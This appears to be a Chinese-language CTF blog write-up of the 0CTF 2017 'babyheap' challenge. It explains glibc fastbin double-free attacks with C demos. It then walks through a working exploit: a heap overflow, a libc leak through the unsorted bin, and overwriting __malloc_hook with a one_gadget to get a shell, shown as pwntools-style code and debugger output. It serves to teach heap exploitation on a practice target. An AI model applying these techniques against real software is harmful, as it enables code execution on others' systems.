@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>0CTF 2017 PWN | Haoliang.Lu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Fastbin Attackfastbin attack 是一类漏洞的利用方法,如果细分的话，可以做如下的分类： Fastbin Double FreeHouse of SpiritAlloc to StackArbitrary Alloc 其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF 2017 PWN">
+<meta property="og:url" content="http://yoursite.com/2017/03/25/0CTF 2017 PWN/index.html">
+<meta property="og:site_name" content="Haoliang.Lu">
+<meta property="og:description" content="Fastbin Attackfastbin attack 是一类漏洞的利用方法,如果细分的话，可以做如下的分类： Fastbin Double FreeHouse of SpiritAlloc to StackArbitrary Alloc 其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256116193375.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256591260016.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256592845524.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256595796529.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256736598087.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256737798349.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256743071737.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256743535105.jpg">
+<meta property="og:updated_time" content="2019-08-11T06:38:53.979Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF 2017 PWN">
+<meta name="twitter:description" content="Fastbin Attackfastbin attack 是一类漏洞的利用方法,如果细分的话，可以做如下的分类： Fastbin Double FreeHouse of SpiritAlloc to StackArbitrary Alloc 其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针">
+<meta name="twitter:image" content="http://yoursite.com/2017/03/25/0CTF%202017%20PWN/15256116193375.jpg">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/typing.css">
+  <link rel="stylesheet" href="/css/donate.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  
+</head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-0CTF 2017 PWN" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">Haoliang.Lu</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a>&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      0CTF 2017 PWN
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>fastbin attack 是一类漏洞的利用方法,如果细分的话，可以做如下的分类：</p>
+<p>Fastbin Double Free<br>House of Spirit<br>Alloc to Stack<br>Arbitrary Alloc</p>
+<p>其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针，直接利用 malloc 申请指定位置 chunk 进行攻击。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。</p>
+<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块</p>
+<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
+<ol>
+<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
+<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
+</ol>
+<p>下面的示例程序说明了这一点，当我们试图执行以下代码时,报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=malloc(0x10);</span><br><span class="line">    chunk2=malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line">    free(chunk1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行如下代码时,即如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=malloc(0x10);</span><br><span class="line">    chunk2=malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line">    free(chunk2);</span><br><span class="line">    free(chunk1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构 main_arena=&gt;chunk1=&gt;chunk2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，再连续malloc两次之后，再次malloc即可返回bss段的地址，从而造成任意地址写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _chunk</span><br><span class="line">&#123;</span><br><span class="line">    long long pre_size;</span><br><span class="line">    long long size;</span><br><span class="line">    long long fd;</span><br><span class="line">    long long bk;  </span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1,*chunk2,*chunk3;</span><br><span class="line">    void *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=0x21;</span><br><span class="line">    chunk1=malloc(0x10);</span><br><span class="line">    chunk2=malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line">    free(chunk2);</span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=malloc(0x10);</span><br><span class="line">    *(long long *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    chunk_b=malloc(0x10);</span><br><span class="line">    printf(&quot;%p&quot;,chunk_b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的CHUNK bss_chunk</p>
+<p><img src="15256116193375.jpg" alt></p>
+<p>值得注意的是，我们在 main 函数的第一步就进行了bss_chunk.size=0x21;的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p>
+<hr>
+<h2 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017 babyheap"></a>0ctf2017 babyheap</h2><p><img src="15256591260016.jpg" alt></p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序是一个堆分配器，主要有以下四种功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;1. Allocate&quot;);</span><br><span class="line">puts(&quot;2. Fill&quot;);</span><br><span class="line">puts(&quot;3. Free&quot;);</span><br><span class="line">puts(&quot;4. Dump&quot;);</span><br><span class="line">puts(&quot;5. Exit&quot;);</span><br><span class="line">return printf(&quot;Command: &quot;);</span><br></pre></td></tr></table></figure>
+
+<p>申请的 chunk 的最大为 4096。此外，我们可以看出每个管理chunk的部分主要有三个字段：是否在使用，堆块大小，堆块位置。<br><img src="15256592845524.jpg" alt></p>
+<p>需要注意的是堆块是由 calloc 分配的，calloc() 函数用来动态地分配内存空间并初始化为 0，其原型为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void* calloc (size_t num, size_t size);</span><br></pre></td></tr></table></figure>
+
+<p>calloc() 与 malloc() 的一个重要区别是：calloc() 在动态分配完内存后，自动初始化该内存空间为零，而 malloc() 不初始化，里边数据是未知的垃圾数据。下面的两种写法是等价的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// calloc() 分配内存空间并初始化</span><br><span class="line">char *str1 = (char *)calloc(10, 2);</span><br><span class="line">// malloc() 分配内存空间并用 memset() 初始化</span><br><span class="line">char *str2 = (char *)malloc(20);</span><br><span class="line">memset(str2, 0, 20);</span><br></pre></td></tr></table></figure>
+
+<p>在填充内容的功能中，使用读取内容的函数是直接读取指定长度的内容，并没有设置字符串结尾。而且这个指定长度是我们指定的，并不是之前 chunk 分配时指定的长度，所以此处存在堆溢出。</p>
+<p><img src="15256595796529.jpg" alt></p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须泄漏一些地址，才可以劫持控制流。基本利用思路如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用 unsorted bin 地址泄漏 libc 基地址。</span><br><span class="line">利用 fastbin attack 将chunk 分配到 malloc_hook 附近,通过malloc_hook函数劫持程序控制流</span><br></pre></td></tr></table></figure>
+
+<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>由于我们是希望使用 unsorted bin 来泄漏 libc 基地址，所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能使 fastbin chunk，也不能和 top chunk 相邻。因为前者会被添加到 fastbin 中，后者在不是fastbin 的情况下，会被合并到 top chunk 中。因此，我们这里构造一个 small bin chunk。在将该 chunk 释放到 unsorted bin 的同时，也需要让另外一个正在使用的 chunk 可以同时指向该 chunk 的位置。这样才可以进行泄漏。具体设计如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10) #0</span><br><span class="line">allocate(0x10) #1</span><br><span class="line">allocate(0x10) #2</span><br><span class="line">allocate(0x10) #3</span><br><span class="line">allocate(0x80) #4</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x564d134f6000</span><br><span class="line">0x564d134f6000:	0x0000000000000000	0x0000000000000021	id0</span><br><span class="line">0x564d134f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x564d134f6020:	0x0000000000000000	0x0000000000000021	id1</span><br><span class="line">0x564d134f6030:	0x0000564d134f6040	0x0000000000000000</span><br><span class="line">0x564d134f6040:	0x0000000000000000	0x0000000000000021	id2</span><br><span class="line">0x564d134f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x564d134f6060:	0x0000000000000000	0x0000000000000021	id3</span><br><span class="line">0x564d134f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x564d134f6080:	0x0000000000000000	0x0000000000000091	id4</span><br><span class="line">0x564d134f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x564d134f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x564d134f6020 —▸ 0x564d134f6040 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line"></span><br><span class="line"># free idx 2, 1, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span><br></pre></td></tr></table></figure>
+
+<p>当我们编辑id0，修改id0的fd后，确实已经将其指向id4了。这里之所以可以成功是因为64位下堆始终是16字节对齐的，所以idx 4的起始地址的第一个字节必然是0x80。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>修改后如下,id1的fd指向了id4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x56360c25f000</span><br><span class="line">0x56360c25f000:	0x0000000000000000	0x0000000000000021	id0</span><br><span class="line">0x56360c25f010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x56360c25f020:	0x0000000000000000	0x0000000000000021	id1</span><br><span class="line">0x56360c25f030:	0x000056360c25f080	0x0000000000000000</span><br><span class="line">0x56360c25f040:	0x0000000000000000	0x0000000000000021	id2</span><br><span class="line">0x56360c25f050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56360c25f060:	0x0000000000000000	0x0000000000000021	id3</span><br><span class="line">0x56360c25f070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x56360c25f080:	0x0000000000000000	0x0000000000000091	id4</span><br><span class="line">0x56360c25f090:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x56360c25f020 —▸ 0x56360c25f080 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br></pre></td></tr></table></figure>
+
+<p>那么，当我们再次申请两个chunk时，第二个申请到的就是id4处的chunk。为了能够申请成功，我们需要确保 id4 的size 与当前 fastbin 的大小一致，所以，我们得修改它的大小。申请成功后，id2会指向id4。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x21)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10) #1</span><br><span class="line">allocate(0x10) #2</span><br></pre></td></tr></table></figure>
+
+<p>之后，如果我们想要将 id4 放到 unsorted bin 中的话，为了防止其与top chunk 合并，我们需要再次申请一个chunk。此后再释放 id4 就会进入 unsorted bin中去了。此时由于 id2 也指向这个地址，所以我们直接展示他的内容就可以得到unsorted bin的地址了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x80) #5</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) + p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">unsorted_bin_addr = dump(2)</span><br><span class="line"></span><br><span class="line">offset = 0x3c4b78</span><br><span class="line">libc_base = unsorted_bin_addr - offset</span><br><span class="line">print hex(libc_base)</span><br></pre></td></tr></table></figure>
+
+<h4 id="hook至one-gadget"><a href="#hook至one-gadget" class="headerlink" title="_hook至one_gadget"></a>_hook至one_gadget</h4><p>tips：</p>
+<p>在arena的上面，有个malloc_hook，当这个地址的值不为0时，我们执行malloc将会先跳到malloc_hook的地址上执行指令。所以这里就有一个思路了，我们把malloc_hook给赋值一个执行shell指令的地址，该地址假设为0xabcd，然后我们执行malloc函数，就可以拿到shell了。</p>
+<p>__malloc_hook附近情况如下：</p>
+<p><img src="15256736598087.jpg" alt></p>
+<p>覆盖malloc_hook很简单，就是通过上面的fastbin_dup方法，malloc出最大是malloc_hook附近的地址，然后通过fill来覆盖malloc_hook。</p>
+<p>这里的唯一问题就是malloc的长度检查，然后fastbin的size范围是0x20-0x80（64位情况下）</p>
+<p>这个问题也好解决，我们可以看看上面的数据，储存了一些地址，而这些地址的高位都是0x7f，所以可以将fastbin的header地址设置为<strong>malloc_hook-0x23，这样，就成功构造了一个有效size，从而利用size=0x7f触发fastbin attack，将</strong>malloc_hook修改为one_gadgets。</p>
+<p><img src="15256737798349.jpg" alt></p>
+<p>接下来通过free掉id4后，再通过fill id2将id4的改为<strong>malloc_hook-0x23，然后allocate两次，第二次得到的就是</strong>malloc_hook-0x23，即id6，再进行fill id6即可劫持__malloc_hook为one_gadget。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_addr = libc_base + 0x3C4B10</span><br><span class="line">one_gadget_addr = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">print &apos;one_gadget_addr is &apos; + hex(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">dst_addr = malloc_hook_addr - 0x23</span><br><span class="line"></span><br><span class="line">print &apos;malloc_hook is &apos; + hex(malloc_hook_addr)</span><br><span class="line"></span><br><span class="line">allocate(0x60) #4</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(dst_addr)</span><br><span class="line">fill(2,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x60) #4</span><br><span class="line">allocate(0x60) #6</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr) </span><br><span class="line"></span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br></pre></td></tr></table></figure>
+
+<p><img src="15256743071737.jpg" alt></p>
+<p>这里的 onegadget 地址也可能需要尝试多次。</p>
+<p>getshell</p>
+<p><img src="15256743535105.jpg" alt></p>
+
+      
+      
+    </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2017/03/25/0CTF 2017 PWN/" class="article-date">
+  <time class="dt-published" datetime="2017-03-24T16:00:00.000Z" itemprop="datePublished">2017-03-25</time>
+</a>
+
+        </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2017/06/20/RCTF 2017 PWN/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          RCTF 2017 PWN
+        
+      </div>
+    </a>
+  
+  
+    <span id="article-nav-older" class="article-nav-link-wrap older"></span>
+  
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>The quieter you become,the more you are able to hear.</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+<script src="/js/typing.js"></script>
+<!--[if lt IE 9]><script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script><![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
+</html>
